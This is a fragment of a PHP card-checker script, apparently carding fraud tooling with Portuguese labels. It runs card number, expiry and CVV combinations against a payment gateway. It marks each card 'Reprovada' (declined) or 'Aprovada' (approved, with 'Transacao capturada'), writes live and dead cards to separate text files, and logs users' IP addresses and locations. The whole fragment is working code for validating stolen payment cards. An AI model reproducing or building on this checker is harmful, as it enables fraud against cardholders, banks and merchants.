    echo "<span class='badge badge-danger'>Reprovada</span> ❌ $cc|$mes|$ano|$cvv » <span class='badge badge-primary'>BANDEIRA</span> $retorno_band - $retorno_scheme <span class='badge badge-primary'>BANCO</span> $retorno_bank <span class='badge badge-primary'>PAIS</span> $retorno_states <span class='badge badge-primary'>TIPO</span> $retorno_type <span class='badge badge-primary'>PREPAID</span> $Verificar_prepaid » <span class='badge badge-info'>Retorno:</span> » <span class='badge badge-warning'>$retorno</span>  » <span class='badge badge-info'>Tempo de resposta:</span> ".(time() - $time)." s <br>";

      $file = fopen("ant-reteste-dies.txt", "a");
      fwrite($file, "$cc|$mes|$ano|$cvv\n");


} elseif(strpos($pagar, "tente novamente")!== false){

    echo "<span class='badge badge-danger'>Reprovada</span> ❌ $cc|$mes|$ano|$cvv » <span class='badge badge-primary'>BANDEIRA</span> $retorno_band - $retorno_scheme <span class='badge badge-primary'>BANCO</span> $retorno_bank <span class='badge badge-primary'>PAIS</span> $retorno_states <span class='badge badge-primary'>TIPO</span> $retorno_type <span class='badge badge-primary'>PREPAID</span> $Verificar_prepaid » <span class='badge badge-info'>Retorno:</span> » <span class='badge badge-warning'>$retorno</span> » <span class='badge badge-info'>Tempo de resposta:</span> ".(time() - $time)." s <br>";

      $file = fopen("ant-reteste-dies.txt", "a");
      fwrite($file, "$cc|$mes|$ano|$cvv\n");


      $ip_users = fopen("IP-USERS.txt", "a");
      fwrite($ip_users, "================================================================\n\n$ip > Localizacao:\n\nPaís: $ip_pais\nEstado: $estado_ip\nCidade: $cidade_ip\nProvedor: $provedor_ip\n\n================================================================\n\n\n");

} else if (strpos($pagar, 'SecurityCode length exceeded')!== false) {

    echo "<span class='badge badge-danger'>Reprovada</span> ❌ $cc|$mes|$ano|$cvv » <span class='badge badge-primary'>BANDEIRA</span> $retorno_band - $retorno_scheme <span class='badge badge-primary'>BANCO</span> $retorno_bank <span class='badge badge-primary'>PAIS</span> $retorno_states <span class='badge badge-primary'>TIPO</span> $retorno_type <span class='badge badge-primary'>PREPAID</span> $Verificar_prepaid » <span class='badge badge-info'>Retorno:</span> » <span class='badge badge-warning'>$retorno</span>  » <span class='badge badge-info'>Tempo de resposta:</span> ".(time() - $time)." s <br>";

      $file = fopen("ant-reteste-dies.txt", "a");
      fwrite($file, "$cc|$mes|$ano|$cvv\n");



      $ip_users = fopen("IP-USERS.txt", "a");
      fwrite($ip_users, "================================================================\n\n$ip > Localizacao:\n\nPaís: $ip_pais\nEstado: $estado_ip\nCidade: $cidade_ip\nProvedor: $provedor_ip\n\n================================================================\n\n\n");



} else if (empty($pagar)) {

    echo "<span class='badge badge-danger'>Reprovada</span> ❌ $cc|$mes|$ano|$cvv » <span class='badge badge-primary'>BANDEIRA</span> $retorno_band - $retorno_scheme <span class='badge badge-primary'>BANCO</span> $retorno_bank <span class='badge badge-primary'>PAIS</span> $retorno_states <span class='badge badge-primary'>TIPO</span> $retorno_type <span class='badge badge-primary'>PREPAID</span> $Verificar_prepaid » <span class='badge badge-info'>Retorno:</span> » <span class='badge badge-warning'>RETORNO N/A</span> » <span class='badge badge-info'>Tempo de resposta:</span> ".(time() - $time)." s <br>";


      $file = fopen("ant-reteste-dies.txt", "a");
      fwrite($file, "$cc|$mes|$ano|$cvv\n");

      $ip_users = fopen("IP-USERS.txt", "a");
      fwrite($ip_users, "================================================================\n\n$ip > Localizacao:\n\nPaís: $ip_pais\nEstado: $estado_ip\nCidade: $cidade_ip\nProvedor: $provedor_ip\n\n================================================================\n\n\n");

}

else{

    echo "<span class='badge badge-success'>Aprovada</span> ✔ $cc|$mes|$ano|$cvv » <span class='badge badge-primary'>BANDEIRA</span> $retorno_band - $retorno_scheme <span class='badge badge-primary'>BANCO</span> $retorno_bank <span class='badge badge-primary'>PAIS</span> $retorno_states <span class='badge badge-primary'>TIPO</span> $retorno_type <span class='badge badge-primary'>PREPAID</span> $Verificar_prepaid » <span class='badge badge-info'>Retorno:</span> » $retorno - Transacao capturada! » <span class='badge badge-info'>Tempo de resposta:</span> ".(time() - $time)." s <br>";


      $file_live = fopen("ant-reteste-lives.txt", "a");
      fwrite($file_live, "$cc|$mes|$ano|$cvv\n");


      $file = fopen("retornogate.txt", "a");
      fwrite($file, "$pagar\n\n\n\n");


}

?>